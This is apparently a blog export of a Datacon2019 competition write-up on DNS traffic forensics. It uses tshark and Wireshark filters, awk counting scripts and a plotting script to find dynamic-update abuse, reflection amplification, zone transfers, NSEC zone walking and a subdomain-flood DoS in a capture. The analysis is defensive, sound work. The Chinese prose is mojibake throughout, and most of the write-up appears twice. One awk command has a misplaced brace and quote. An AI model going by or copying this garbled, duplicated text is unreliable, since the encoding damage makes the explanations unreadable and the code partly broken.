å¯ä»¥çœ‹åˆ°åˆ°188.141.167.218ã€70.85.232.160ã€187.199.129.12 æ˜¯åå°„ç”¨çš„é€’å½’DNSï¼Œè€Œä¼ªé€ å‡ºçš„æºåœ°å€127,130.104.152ã€175.222.102.169ã€105.191.150.205 åˆ™éƒ½æ˜¯å—å®³è€…ã€‚ ä»å›¾ä¸­ï¼Œ102.181.153.79ä¹Ÿæ¯”è¾ƒå¯ä»¥ï¼Œä½†æ˜¯ä½¿ç”¨ip.addr==102.181.153.79å¯ä»¥çœ‹å‡ºå®ƒçš„è¯·æ±‚ç±»å‹ä¸»è¦æ˜¯MXã€NSå’ŒCNAMEã€‚ tshark -r q1_final.pcap -Y 'dns.qry.type in &#123;255&#125; and dns.flags.recdesired == 1 and dns.qry.name in &#123;&quot;734a5.gov&quot; &quot;d1a4.cc&quot;&#125; and not dns.flags.response == 1 and ip.src in &#123;127.130.104.152 175.222.102.169 105.191.150.205&#125;' -T fields -e frame.number -e ip.src -e dns.qry.name | awk '&#123;print $1&quot;,3&quot;&#125; &gt; Reflect.csv ä¸Šè¿°å‘½ä»¤æŠŠè¿™äº›æ”»å‡»åŒ…çš„æ ‡å·å’Œç±»å‹(3) è¾“å‡ºåˆ°äº†Reflect.csvã€‚ 0x03 æœªæˆæƒçš„åŸŸä¼ è¾“æ”»å‡» ç»§ç»­æµè§ˆé™¤äº†A(1) å’ŒAAAA(28) ä»¥å¤–çš„DNS è¯·æ±‚ï¼Œæˆ‘ä»¬çœ‹åˆ°äº†æœªæˆæƒçš„DNS åŸŸä¼ é€æ”»å‡»ã€‚ æˆ‘ä»¬ç”¨æ˜¾ç¤ºè¿‡æ»¤å™¨dns.qry.type in &#123;252 251&#125;æŠŠAXFR å’ŒIXFR è¿‡æ»¤å‡ºæ¥ï¼š å¯ä»¥æ‰‹å·¥éªŒè¯ï¼Œæœ‰ä¸¤ä¸ª221.223.19.169 å’Œä¸€ä¸ª129.191.74.107 å‘æ¥çš„åŸŸä¼ é€è¯·æ±‚åŒ…ï¼Œä»¥åŠå¤§é‡çš„96.199.230.176 å‘æ¥çš„åŸŸä¼ é€è¯·æ±‚åŒ…ã€‚æˆ‘ä»¬è®¤ä¸ºå‰é¢ä¸¤ä¸ªæœ‰å¯èƒ½æ˜¯ç®¡ç†å‘˜é…ç½®ä¸å½“ç­‰é€ æˆçš„ï¼Œè€Œæœ€åçš„ä¸€ä¸ªå¤§é‡çš„è¯·æ±‚æ•°æ®åŒ…æ˜¾ç„¶å°±æ˜¯åŸŸä¼ é€æ”»å‡»äº†ã€‚ä½¿ç”¨ä»¥ä¸‹å‘½ä»¤æå–å‡ºæˆ‘ä»¬è®¤ä¸ºæ˜¯æ”»å‡»çš„åŒ…ï¼š tshark -r q1_final.pcap -Y &quot;dns.qry.type in &#123;251 252&#125; and not ip.addr in &#123;221.223.19.169 129.191.74.107&#125; and not dns.flags.response == 1&quot; -T fields -e frame.number -e ip.src | awk '&#123;print $1&quot;,4&quot;; ip[$2] += 1&#125;' &gt; AXFR.csv ä¸Šè¿°å‘½ä»¤æŠŠè¿™äº›æ”»å‡»åŒ…çš„æ ‡å·å’Œç±»å‹(4) è¾“å‡ºåˆ°äº†AXFR.csvã€‚ 0x04 DNSSec NSec åŸŸåéå† ç»§ç»­æµè§ˆé™¤äº†A(1) å’ŒAAAA(28) ä»¥å¤–çš„DNS è¯·æ±‚ï¼Œå¯ä»¥çœ‹åˆ°DNSSec åŸŸåéå†æ”»å‡»ï¼š ç”±äºåŸŸåéå†æ”»å‡»ä¾èµ–äºNSecï¼Œæˆ‘ä»¬å¯ä»¥é‡æ–°æ‰§è¡Œ tshark -r q1_final.pcap -R &quot;dns.resp.type == 47 and not dns.qry.type == 255&quot; ä»åŸæ¥çš„æ‰€æœ‰åŒ…ä¸­é‡æ–°è¿‡æ»¤æ‰€æœ‰æ¶‰åŠåˆ°NSec(47) é¡¹çš„å“åº”æ•°æ®åŒ…ï¼š å®¹æ˜“æ‰‹å·¥éªŒè¯ï¼Œåœ¨æ‰€æœ‰çš„åŸŸåéå†æ”»å‡»ä¸­ï¼Œæ”»å‡»è€…åªæœ‰6.116.183.244 ä¸€ä¸ªäººã€‚æˆ‘ä»¬å¯ä»¥ç”¨ï¼š wireshark -r q1_final.pcap -R &quot;dns and ip.addr == 6.116.183.244&quot; è¿‡æ»¤å‡º6.116.183.244 å‘é€çš„æ‰€æœ‰åŒ…ï¼š å¯è§æ‰€æœ‰çš„æ”»å‡»åŒ…éƒ½æ˜¯SOA æˆ–è€…DS ç±»å‹çš„ã€‚ä½¿ç”¨ä»¥ä¸‹å‘½ä»¤æå–å‡ºæ”»å‡»çš„åŒ… tshark -r q1_final.pcap -Y 'dns and dns.qry.type in &#123;43 6&#125; and dns.flags.response == 0 and ip.src == 6.116.183.244' -T fields -e frame.number -e ip.dst | awk '&#123;print $1&quot;,1&quot;&#125;' &gt; DNSSec.csv 0x05 Doså­åŸŸåéå†æ”»å‡» **åˆ‡å…¥ç‚¹ï¼š**æˆ‘ä»¬å¯ä»¥å…ˆç»Ÿè®¡ä¸€ä¸‹DNS æŸ¥è¯¢åˆ°ä¸€ä¸ªä¸å­˜åœ¨çš„åŸŸåçš„æ¬¡æ•°åŠå…¶è¯·æ±‚å‘èµ·äººçš„IPï¼Œå…·ä½“è€Œè¨€å¯ä»¥ä½¿ç”¨å¦‚ä¸‹çš„å‘½ä»¤ï¼š tshark -r q1_final.pcap -Y &quot;dns and dns.flags.rcode == 3&quot; -T fields -e ip.src -e ip.dst -e dns.qry.name | awk '&#123;ip = $2; doname = substr($3, index($3,&quot;.&quot;), length($3)); c_ip_doname[ip&quot;@@@&quot;doname] += 1&#125; END &#123;for(i in c_ip_doname) print i, c_ip_doname[i]&#125;' &gt; No_such_name.csv ``substr(string, start [, length ])ï¼šReturn a length-character-long substring of string, starting at character number start. The first character of a string is character number one. `index(str1, str2)ï¼š This searches the string str1 for the first occurrences of the string str2, and returns the position in characters where that occurrence begins in the string str1 ä»¥åŸŸåä¸ºæ’åºæ ‡å‡†ï¼ŒæŸ¥çœ‹No_such_name.csvï¼š cat No_such_name.csv | sort -k2nr | less å¯ä»¥çœ‹åˆ°ï¼Œ144.202.64.226æŸ¥è¯¢äº†30318æ¬¡*b0e.com.cnä¸‹é¢ä¸å­˜åœ¨çš„åŸŸåï¼Œæ˜¯æ‰€æœ‰IPä¸­æ¬¡æ•°æœ€å¤šçš„ã€‚æˆ‘ä»¬å¯ä»¥ä½¿ç”¨ï¼š wireshark -r q1_final.pcap -R &quot;dns and ip.addr == 144.202.64.226&quot; è¿›ä¸€æ­¥æŸ¥çœ‹144.202.64.226ç›¸å…³çš„åŒ…ï¼š å¯ä»¥çœ‹å‡ºï¼Œæ”»å‡»äºº144.202.64.226 é€‰äº†182.254.116.116 ã€119.29.29.29 å’Œ223.6.6.6 ä¸‰ä¸ªé€’å½’DNS æœåŠ¡å™¨ä½œä¸ºä¸­é—´â€œè·³æ¿â€ï¼Œæ”»å‡»b0e.com.cn çš„æƒå¨DNS æœåŠ¡å™¨ã€‚æœ¬æ¥æ”»å‡»è€…è¿˜æƒ³åˆ©ç”¨223.5.5.5 ä½œä¸ºâ€œè·³æ¿â€çš„ï¼Œä½†æ˜¯çœ‹èµ·æ¥è¿™å°DNS æœåŠ¡å™¨æ²¡æœ‰å·¥ä½œï¼Œæ— æ³•åˆ©ç”¨ã€‚ å¯¹äºæ¯ä¸ªå­åŸŸåï¼Œæ”»å‡»äººéƒ½è®¿é—®äº†ä¸¤æ¬¡ã€‚ç¬¬äºŒæ¬¡æ˜æ˜¾å¿«äºç¬¬ä¸€æ¬¡ï¼Œè¯´æ˜è¯·æ±‚ç¡®å®åˆ°è¾¾äº†æƒå¨DNSæœåŠ¡å™¨å¹¶è¢«é€’å½’æœåŠ¡å™¨ç¼“å­˜ã€‚ ä½¿ç”¨ä¸‹åˆ—å‘½ä»¤å¯ä»¥æå–å‡ºæ”»å‡»çš„åŒ…ï¼š tshark -r q1_final.pcap -Y 'dns and dns.flags.response == 0 and ip.src == 144.202.64.226' -T fields -e frame.number -e ip.dst -e dns.qry.name | awk '&#123;print $1&quot;,2&quot;&#125;' &gt; DOS.csv ä½¿ç”¨ä¸‹åˆ—å‘½ä»¤æå–â€œè·³æ¿æœºå™¨â€çš„dnsåŠå…¶è¢«åˆ©ç”¨æ¬¡æ•°ï¼š tshark -r q1_final.pcap -Y 'dns and dns.flags.response == 0 and ip.src == 144.202.64.226' -T fields -e frame.number -e ip.dst -e dns.qry.name | awk '&#123;dns[$2] += 1&#125; END &#123;for(ip in dns) print ip, dns[ip]'&#125; 119.29.29.29 15719 182.254.116.116 16227 223.6.6.6 2247 223.5.5.5 1 ä½¿ç”¨ä¸‹åˆ—å‘½ä»¤æå–è¯¢é—®æ¬¡æ•°ä¸æ˜¯ä¸¤æ¬¡çš„åŸŸåï¼š tshark -r q1_final.pcap -Y 'dns and dns.flags.response == 0 and ip.src == 144.202.64.226' -T fields -e frame.number -e ip.dst -e dns.qry.name | awk '&#123;domain[$3] += 1&#125; END &#123;for(i in domain) if(domain[i] != 2) print i, domain[i]&#125;' &gt; query_one_time_domain.csv æˆ‘ä»¬å‘ç°ï¼šè¿™äº›åŸŸåè¦ä¹ˆæ˜¯Google çš„8.8.8.8ï¼Œè®¿é—®äº†å››æ¬¡ï¼Œç”¨äºè¯•æ¢å››ä¸ªâ€œè·³æ¿â€DNS é€’å½’æœåŠ¡å™¨æ˜¯å¦å·¥ä½œï¼›è¦ä¹ˆæ˜¯æ²¡æœ‰æ”¶åˆ°å“åº”çš„è¯·æ±‚ï¼Œå› æ­¤åªè®¿é—®äº†ä¸€æ¬¡ã€‚è¿™é—´æ¥çš„è¯´æ˜äº†å—å®³è€…çš„èµ„æºå·²ç»è¢«æ¶ˆè€—äº†éå¸¸å¤šï¼Œæ”»å‡»äººå¯¹äºb0e.com.cn æƒå¨æœåŠ¡å™¨çš„DoS æ”»å‡»æ˜¯æˆåŠŸçš„ã€‚ 0x06 åˆ†ææ€è·¯æ€»ç»“ é¦–å…ˆæŸ¥çœ‹Opcodeä¸ä¸º0ï¼Œå³éStandard Queryçš„æŸ¥è¯¢æ•°æ®åŒ… ç‰¹å¾å­—æ®µï¼šdns.flags.opcode dns.flags.opcode != 0(Standard query) dns.flags.opcode == 5(Dynamic Update) â€”&gt; æœªæˆæƒçš„DNS Dynamic Update å†æŸ¥çœ‹ç±»å‹ä¸ä¸ºA(1)å’ŒAAAA(28)ï¼Œå³IPV4å’ŒIPV6çš„æŸ¥è¯¢æ•°æ®åŒ… ç‰¹å¾å­—æ®µï¼šdns.qry.type dns.qry.type != 1(A) and 28(AAAA) ``dns.qry.type == 255(* ALL)` â€”&gt; åå°„æ”¾å¤§æ”»å‡» dns.qry.type == 252(AXFR) â€”&gt; æœªæˆæƒçš„DNSåŸŸä¼ è¾“æ”»å‡» dns.qry.type == 43(DS) and 6(SOA) â€”&gt; DNSSec åŸŸåéå†æ”»å‡» æœ€åå¯ä»¥ç»Ÿè®¡ä¸€ä¸‹è¿”å›No Such Nameçš„å“åº”æ•°æ®åŒ… ç‰¹å¾å­—æ®µï¼šdns.flags.rcode dns.flags.rcode != 0(No Error) dns.flags.rcode == 3(No such name) â€”&gt; DoSæ”»å‡»","tags":[{"name":"Wireshark","slug":"Wireshark","permalink":"http://ca0y1h.top/tags/Wireshark/"},{"name":"æµé‡åˆ†æ","slug":"æµé‡åˆ†æ","permalink":"http://ca0y1h.top/tags/%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/"},{"name":"DNS","slug":"DNS","permalink":"http://ca0y1h.top/tags/DNS/"},{"name":"Datacon2019","slug":"Datacon2019","permalink":"http://ca0y1h.top/tags/Datacon2019/"}],"categories":[{"name":"æµé‡åˆ†æ","slug":"æµé‡åˆ†æ","permalink":"http://ca0y1h.top/categories/%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/"},{"name":"æ¯”èµ›é¢˜","slug":"æµé‡åˆ†æ/æ¯”èµ›é¢˜","permalink":"http://ca0y1h.top/categories/%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/%E6%AF%94%E8%B5%9B%E9%A2%98/"}]},{"title":"Datacon2019-q1-Writeup-v2","date":"2019-07-21T06:15:38.000Z","path":"Web_security/ctf_writeup/2.Datacon2019-q1-Writeup-v2/","text":"Datacon2019-q1-Writeup-v2 è¿™ä¸€è½®æµé‡åˆ†æä¸»è¦æ˜¯åˆ†æä¸ºä¸»ï¼Œä»¥è¿™ç¯‡Writeupä¸ºå‚è€ƒï¼Œæœ‰å…³DNSçš„æ”»å‡»ç±»å‹ã€æ”»å‡»æ‰‹æ®µå’Œæ”»å‡»ç‰¹å¾ï¼Œè¯¦è§[DNSæ”»å‡»æµé‡åˆ†æè¯†åˆ«-v1 ç³»ç»Ÿç¯å¢ƒ Windows10 64bitï¼› wireshark 3.0.3 (v3.0.3-0-g6130b92b0ec6) ï¼› TShark (Wireshark) 3.0.3 (v3.0.3-0-g6130b92b0ec6)ï¼› Cmder 18026 previewï¼› python 3.7ï¼› Excel 2016 æœªæˆæƒçš„Dynamic Update **åˆ‡å…¥ç‚¹ï¼š**ç²—ç•¥è§‚å¯Ÿç»å¤§éƒ¨åˆ†DNSåŒ…çš„Opcodeéƒ½æ˜¯0ï¼ˆStandard Queryï¼‰ï¼Œä½†æ˜¯æˆ‘ä»¬ä¹Ÿå¯ä»¥åˆ†æOpcodeä¸ä¸ºé›¶çš„ã€‚ä½¿ç”¨ä»¥ä¸‹å‘½ä»¤ç­›é€‰ï¼š dns and not dns.flags.opcode==0 å¯ä»¥çœ‹åˆ°ï¼Œå…¨éƒ¨éƒ½æ˜¯DNS Dynamic Updateè¯·æ±‚ã€‚æ¥ä¸‹æ¥ï¼Œä½¿ç”¨åœ¨Cmderä¸­ä½¿ç”¨tsharkå‘½ä»¤ç­›é€‰å‡ºæ‰€æœ‰çš„æ”»å‡»IPï¼š tshark.exe -r q1_final.pcap -Y &quot;dns.flags.opcode==5 &amp;&amp; dns.flags.response==0&quot; -T fields -e ip.src -e ip.dst |awk '&#123;print $1&quot;-&gt;&quot;$2&#125;' &gt; DynamicDNSip.csv ä»å›¾ä¸­å¯ä»¥çœ‹åˆ°æœ‰å››ä¸ªæ”»å‡»æ¥æºï¼š19.220.251.87 414ï¼Œ200.152.141.106 15ï¼Œ18.100.48.86 4091ï¼Œ237.205.156.233 535ã€‚ç”±äºæ­£å¸¸çš„Dynamic Update ä¸ä¼šå‘é€è¿™ä¹ˆå¤šä¸”è¿™ä¹ˆé¢‘ç¹çš„è¯·æ±‚ï¼Œè€Œä¸”æ¶‰åŠåˆ°äºŒçº§åŸŸåcom.cnä»¥åŠå¾ˆå¤šå…¶ä»–ä¸åŒåŸŸåçš„æ›´æ–°ï¼Œå› æ­¤æˆ‘ä»¬è®¤ä¸ºè¿™äº›éƒ½æ˜¯æ”»å‡»ã€‚å†ä½¿ç”¨ä¸‹é¢ä¸€è¡Œå‘½ä»¤æŠŠä»–ä»¬é€‰å‡ºæ¥ï¼š tshark.exe -r q1_final.pcap -Y &quot;dns and not dns.flags.opcode == 0 and dns.flags.response == 0&quot; -T fields -e frame.number -e ip.src | awk '&#123;print $1&quot;,5&quot;; ip[$2] += 1&#125;' &gt; DynamicDNS.csv ä¸Šè¿°å‘½ä»¤æŠŠè¿™äº›æ”»å‡»åŒ…çš„æ ‡å·å’Œç±»å‹(5) è¾“å‡ºåˆ°äº†DynamicDNS.csv åå°„æ”¾å¤§æ”»å‡» **åˆ‡å…¥ç‚¹ï¼š**æˆ‘ä»¬æ¥ä¸‹æ¥å†çœ‹çœ‹é™¤äº†A(1) å’ŒAAAA(28) è¿™ä¸¤ä¸ªå¸¸è§ç±»å‹ä»¥å¤–çš„DNS è¯·æ±‚ã€‚ä½¿ç”¨å¦‚ä¸‹å‘½ä»¤å¯åŠ¨ wiresharkï¼š wireshark -r q1_final.pcap -R &quot;dns and not dns.query.type in &#123;1, 28&#125; and dns.flags.opcode == 0&quot; å¦‚å›¾æ‰€ç¤ºï¼Œå¯ä»¥çœ‹åˆ°æœ‰å¾ˆå¤šæ‚ä¸ƒæ‚å…«çš„DNS è¯·æ±‚ã€‚ä¸ºä¾¿äºè§‚å¯Ÿï¼Œæˆ‘ä»¬æŒ‰ç…§è¯·æ±‚ç±»å‹æ’åºã€‚ç®€å•æµè§ˆä¸€ä¸‹ï¼Œæˆ‘ä»¬å°±èƒ½å¤Ÿå‘ç°ä¸€äº›æ”»å‡»ã€‚ä¾‹å¦‚ï¼Œæˆ‘ä»¬å¯ä»¥çœ‹åˆ°åå°„æ”¾å¤§æ”»å‡»ï¼š ä½¿ç”¨ä»¥ä¸‹å‘½ä»¤ç»Ÿè®¡å„IPçš„è¿›/å‡ºæµé‡ï¼š tshark -r q1_final.pcap -T fields -e ip.src -e ip.dst -e frame.len | awk '&#123;send[$1] += $3; rece[$1] += 0; rece[$2] += $3; send[$2] += 0;&#125; END &#123;for(ip in send) if(rece[ip] == 0) tmp = 1e60; else tmp = send[ip]/rece[ip]; for(ip in send) print ip, send[ip], rece[ip], tmp; &#125;' &gt; send_rece.csv ä¸ºäº†æ›´å®¹æ˜“è§‚å¯Ÿè¿™äº›IPçš„æµé‡ç‰¹å¾ï¼Œå¯ä»¥ä½¿ç”¨Pythonçš„matplotlibæ¨¡å—ä½œå›¾ï¼š 1234567891011121314151617181920212223242526import matplotlib.pyplot as pltimport csvsend = []rece = []ip = []with open(&#x27;send_rece.csv&#x27; ,&#x27;r&#x27;) as csvfile: plots = csv.reader(csvfile, delimiter=&#x27; &#x27;) for row in plots: if row[0] == &#x27;45.80.170.1&#x27;: continue send.append(int(row[1])) rece.append(int(row[2])) ip.append(row[0])fig, ax = plt.subplots()ax.scatter(send, rece, label=&#x27;&#x27;)for i, txt in enumerate(ip): if send[i] &gt; 8e6 or rece[i] &gt; 8e6: ax.annotate(txt, (send[i], rece[i]))plt.xlabel(&#x27;send&#x27;)plt.ylabel(&#x27;receive&#x27;)plt.title(&#x27;&#x27;)plt.legend()plt.show() ä¸ºä»€ä¹ˆè¦æ’é™¤45.80.170.1ï¼š æˆ‘ä»¬å¯ä»¥ä½¿ç”¨å‘½ä»¤wireshark -r q1_final.pcap -R &quot;dns and ip.addr == 45.80.170.1&quot;æŸ¥çœ‹ç›¸å…³æµé‡ï¼š å¯ä»¥çœ‹å‡ºè¿™ä¸ªIPæ˜¯ä¸€ä¸ªDNSæœåŠ¡ã€‚ å¯ä»¥çœ‹åˆ°åˆ°188.141.167.218ã€70.85.232.160ã€187.199.129.12 æ˜¯åå°„ç”¨çš„é€’å½’DNSï¼Œè€Œä¼ªé€ å‡ºçš„æºåœ°å€127,130.104.152ã€175.222.102.169ã€105.191.150.205 åˆ™éƒ½æ˜¯å—å®³è€…ã€‚ ä»å›¾ä¸­ï¼Œ102.181.153.79ä¹Ÿæ¯”è¾ƒå¯ä»¥ï¼Œä½†æ˜¯ä½¿ç”¨ip.addr==102.181.153.79å¯ä»¥çœ‹å‡ºå®ƒçš„è¯·æ±‚ç±»å‹ä¸»è¦æ˜¯MXã€NSå’ŒCNAMEã€‚ tshark -r q1_final.pcap -Y 'dns.qry.type in &#123;255&#125; and dns.flags.recdesired == 1 and dns.qry.name in &#123;&quot;734a5.gov&quot; &quot;d1a4.cc&quot;&#125; and not dns.flags.response == 1 and ip.src in &#123;127.130.104.152 175.222.102.169 105.191.150.205&#125;' -T fields -e frame.number -e ip.src -e dns.qry.name | awk '&#123;print $1&quot;,3&quot;&#125; &gt; Reflect.csv ä¸Šè¿°å‘½ä»¤æŠŠè¿™äº›æ”»å‡»åŒ…çš„æ ‡å·å’Œç±»å‹(3) è¾“å‡ºåˆ°äº†Reflect.csvã€‚ æœªæˆæƒçš„åŸŸä¼ è¾“æ”»å‡» ç»§ç»­æµè§ˆé™¤äº†A(1) å’ŒAAAA(28) ä»¥å¤–çš„DNS è¯·æ±‚ï¼Œæˆ‘ä»¬çœ‹åˆ°äº†æœªæˆæƒçš„DNS åŸŸä¼ é€æ”»å‡»ã€‚ æˆ‘ä»¬ç”¨æ˜¾ç¤ºè¿‡æ»¤å™¨dns.qry.type in &#123;252 251&#125;æŠŠAXFR å’ŒIXFR è¿‡æ»¤å‡ºæ¥ï¼š å¯ä»¥æ‰‹å·¥éªŒè¯ï¼Œæœ‰ä¸¤ä¸ª221.223.19.169 å’Œä¸€ä¸ª129.191.74.107 å‘æ¥çš„åŸŸä¼ é€è¯·æ±‚åŒ…ï¼Œä»¥åŠå¤§é‡çš„96.199.230.176 å‘æ¥çš„åŸŸä¼ é€è¯·æ±‚åŒ…ã€‚æˆ‘ä»¬è®¤ä¸ºå‰é¢ä¸¤ä¸ªæœ‰å¯èƒ½æ˜¯ç®¡ç†å‘˜é…ç½®ä¸å½“ç­‰é€ æˆçš„ï¼Œè€Œæœ€åçš„ä¸€ä¸ªå¤§é‡çš„è¯·æ±‚æ•°æ®åŒ…æ˜¾ç„¶å°±æ˜¯åŸŸä¼ é€æ”»å‡»äº†ã€‚ä½¿ç”¨ä»¥ä¸‹å‘½ä»¤æå–å‡ºæˆ‘ä»¬è®¤ä¸ºæ˜¯æ”»å‡»çš„åŒ…ï¼š tshark -r q1_final.pcap -Y &quot;dns.qry.type in &#123;251 252&#125; and not ip.addr in &#123;221.223.19.169 129.191.74.107&#125; and not dns.flags.response == 1&quot; -T fields -e frame.number -e ip.src | awk '&#123;print $1&quot;,4&quot;; ip[$2] += 1&#125;' &gt; AXFR.csv ä¸Šè¿°å‘½ä»¤æŠŠè¿™äº›æ”»å‡»åŒ…çš„æ ‡å·å’Œç±»å‹(4) è¾“å‡ºåˆ°äº†AXFR.csvã€‚ DNSSec NSec åŸŸåéå† ç»§ç»­æµè§ˆé™¤äº†A(1) å’ŒAAAA(28) ä»¥å¤–çš„DNS è¯·æ±‚ï¼Œå¯ä»¥çœ‹åˆ°DNSSec åŸŸåéå†æ”»å‡»ï¼š ç”±äºåŸŸåéå†æ”»å‡»ä¾èµ–äºNSecï¼Œæˆ‘ä»¬å¯ä»¥é‡æ–°æ‰§è¡Œ tshark -r q1_final.pcap -R &quot;dns.resp.type == 47 and not dns.qry.type == 255&quot; ä»åŸæ¥çš„æ‰€æœ‰åŒ…ä¸­é‡æ–°è¿‡æ»¤æ‰€æœ‰æ¶‰åŠåˆ°NSec(47) é¡¹çš„å“åº”æ•°æ®åŒ…ï¼š å®¹æ˜“æ‰‹å·¥éªŒè¯ï¼Œåœ¨æ‰€æœ‰çš„åŸŸåéå†æ”»å‡»ä¸­ï¼Œæ”»å‡»è€…åªæœ‰6.116.183.244 ä¸€ä¸ªäººã€‚æˆ‘ä»¬å¯ä»¥ç”¨ï¼š wireshark -r q1_final.pcap -R &quot;dns and ip.addr == 6.116.183.244&quot; è¿‡æ»¤å‡º6.116.183.244 å‘é€çš„æ‰€æœ‰åŒ…ï¼š å¯è§æ‰€æœ‰çš„æ”»å‡»åŒ…éƒ½æ˜¯SOA æˆ–è€…DS ç±»å‹çš„ã€‚ä½¿ç”¨ä»¥ä¸‹å‘½ä»¤æå–å‡ºæ”»å‡»çš„åŒ… tshark -r q1_final.pcap -Y 'dns and dns.qry.type in &#123;43 6&#125; and dns.flags.response == 0 and ip.src == 6.116.183.244' -T fields -e frame.number -e ip.dst | awk '&#123;print $1&quot;,1&quot;&#125;' &gt; DNSSec.csv Doså­åŸŸåéå†æ”»å‡» **åˆ‡å…¥ç‚¹ï¼š**æˆ‘ä»¬å¯ä»¥å…ˆç»Ÿè®¡ä¸€ä¸‹DNS æŸ¥è¯¢åˆ°ä¸€ä¸ªä¸å­˜åœ¨çš„åŸŸåçš„æ¬¡æ•°åŠå…¶è¯·æ±‚å‘èµ·äººçš„IPï¼Œå…·ä½“è€Œè¨€å¯ä»¥ä½¿ç”¨å¦‚ä¸‹çš„å‘½ä»¤ï¼š tshark -r q1_final.pcap -Y &quot;dns and dns.flags.rcode == 3&quot; -T fields -e ip.src -e ip.dst -e dns.qry.name | awk '&#123;ip = $2; doname = substr($3, index($3,&quot;.&quot;), length($3)); c_ip_doname[ip&quot;@@@&quot;doname] += 1&#125; END &#123;for(i in c_ip_doname) print i, c_ip_doname[i]&#125;' &gt; No_such_name.csv ``substr(string, start [, length ])ï¼šReturn a length-character-long substring of string, starting at character number start. The first character of a string is character number one. `index(str1, str2)ï¼š This searches the string str1 for the first occurrences of the string str2, and returns the position in characters where that occurrence begins in the string str1 ä»¥åŸŸåä¸ºæ’åºæ ‡å‡†ï¼ŒæŸ¥çœ‹No_such_name.csvï¼š cat No_such_name.csv | sort -k2nr | less å¯ä»¥çœ‹åˆ°ï¼Œ144.202.64.226æŸ¥è¯¢äº†30318æ¬¡*b0e.com.cnä¸‹é¢ä¸å­˜åœ¨çš„åŸŸåï¼Œæ˜¯æ‰€æœ‰IPä¸­æ¬¡æ•°æœ€å¤šçš„ã€‚æˆ‘ä»¬å¯ä»¥ä½¿ç”¨ï¼š wireshark -r q1_final.pcap -R &quot;dns and ip.addr == 144.202.64.226&quot; è¿›ä¸€æ­¥æŸ¥çœ‹144.202.64.226ç›¸å…³çš„åŒ…ï¼š å¯ä»¥çœ‹å‡ºï¼Œæ”»å‡»äºº144.202.64.226 é€‰äº†182.254.116.116 ã€119.29.29.29 å’Œ223.6.6.6 ä¸‰ä¸ªé€’å½’DNS æœåŠ¡å™¨ä½œä¸ºä¸­é—´â€œè·³æ¿â€ï¼Œæ”»å‡»b0e.com.cn çš„æƒå¨DNS æœåŠ¡å™¨ã€‚æœ¬æ¥æ”»å‡»è€…è¿˜æƒ³åˆ©ç”¨223.5.5.5 ä½œä¸ºâ€œè·³æ¿â€çš„ï¼Œä½†æ˜¯çœ‹èµ·æ¥è¿™å°DNS æœåŠ¡å™¨æ²¡æœ‰å·¥ä½œï¼Œæ— æ³•åˆ©ç”¨ã€‚ å¯¹äºæ¯ä¸ªå­åŸŸåï¼Œæ”»å‡»äººéƒ½è®¿é—®äº†ä¸¤æ¬¡ã€‚ç¬¬äºŒæ¬¡æ˜æ˜¾å¿«äºç¬¬ä¸€æ¬¡ï¼Œè¯´æ˜è¯·æ±‚ç¡®å®åˆ°è¾¾äº†æƒå¨DNSæœåŠ¡å™¨å¹¶è¢«é€’å½’æœåŠ¡å™¨ç¼“å­˜ã€‚ ä½¿ç”¨ä¸‹åˆ—å‘½ä»¤å¯ä»¥æå–å‡ºæ”»å‡»çš„åŒ…ï¼š tshark -r q1_final.pcap -Y 'dns and dns.flags.response == 0 and ip.src == 144.202.64.226' -T fields -e frame.number -e ip.dst -e dns.qry.name | awk '&#123;print $1&quot;,2&quot;&#125;' &gt; DOS.csv ä½¿ç”¨ä¸‹åˆ—å‘½ä»¤æå–â€œè·³æ¿æœºå™¨â€çš„dnsåŠå…¶è¢«åˆ©ç”¨æ¬¡æ•°ï¼š tshark -r q1_final.pcap -Y 'dns and dns.flags.response == 0 and ip.src == 144.202.64.226' -T fields -e frame.number -e ip.dst -e dns.qry.name | awk '&#123;dns[$2] += 1&#125; END &#123;for(ip in dns) print ip, dns[ip]'&#125; 119.29.29.29 15719 182.254.116.116 16227 223.6.6.6 2247 223.5.5.5 1 ä½¿ç”¨ä¸‹åˆ—å‘½ä»¤æå–è¯¢é—®æ¬¡æ•°ä¸æ˜¯ä¸¤æ¬¡çš„åŸŸåï¼š tshark -r q1_final.pcap -Y 'dns and dns.flags.response == 0 and ip.src == 144.202.64.226' -T fields -e frame.number -e ip.dst -e dns.qry.name | awk '&#123;domain[$3] += 1&#125; END &#123;for(i in domain) if(domain[i] != 2) print i, domain[i]&#125;' &gt; query_one_time_domain.csv æˆ‘ä»¬å‘ç°ï¼šè¿™äº›åŸŸåè¦ä¹ˆæ˜¯Google çš„8.8.8.8ï¼Œè®¿é—®äº†å››æ¬¡ï¼Œç”¨äºè¯•æ¢å››ä¸ªâ€œè·³æ¿â€DNS é€’å½’æœåŠ¡å™¨æ˜¯å¦å·¥ä½œï¼›è¦ä¹ˆæ˜¯æ²¡æœ‰æ”¶åˆ°å“åº”çš„è¯·æ±‚ï¼Œå› æ­¤åªè®¿é—®äº†ä¸€æ¬¡ã€‚è¿™é—´æ¥çš„è¯´æ˜äº†å—å®³è€…çš„èµ„æºå·²ç»è¢«æ¶ˆè€—äº†éå¸¸å¤šï¼Œæ”»å‡»äººå¯¹äºb0e.com.cn æƒå¨æœåŠ¡å™¨çš„DoS æ”»å‡»æ˜¯æˆåŠŸçš„ã€‚ åˆ†ææ€è·¯æ€»ç»“ é¦–å…ˆæŸ¥çœ‹Opcodeä¸ä¸º0ï¼Œå³éStandard Queryçš„æŸ¥è¯¢æ•°æ®åŒ… ç‰¹å¾å­—æ®µï¼šdns.flags.opcode dns.flags.opcode != 0(Standard query) dns.flags.opcode == 5(Dynamic Update) â€”&gt; æœªæˆæƒçš„DNS Dynamic Update å†æŸ¥çœ‹ç±»å‹ä¸ä¸ºA(1)å’ŒAAAA(28)ï¼Œå³IPV4å’ŒIPV6çš„æŸ¥è¯¢æ•°æ®åŒ… ç‰¹å¾å­—æ®µï¼šdns.qry.type dns.qry.type != 1(A) and 28(AAAA) ``dns.qry.type == 255(* ALL)` â€”&gt; åå°„æ”¾å¤§æ”»å‡» dns.qry.type == 252(AXFR) â€”&gt; æœªæˆæƒçš„DNSåŸŸä¼ è¾“æ”»å‡» dns.qry.type == 43(DS) and 6(SOA) â€”&gt; DNSSec åŸŸåéå†æ”»å‡» æœ€åå¯ä»¥ç»Ÿè®¡ä¸€ä¸‹è¿”å›No Such Nameçš„å“åº”æ•°æ®åŒ… 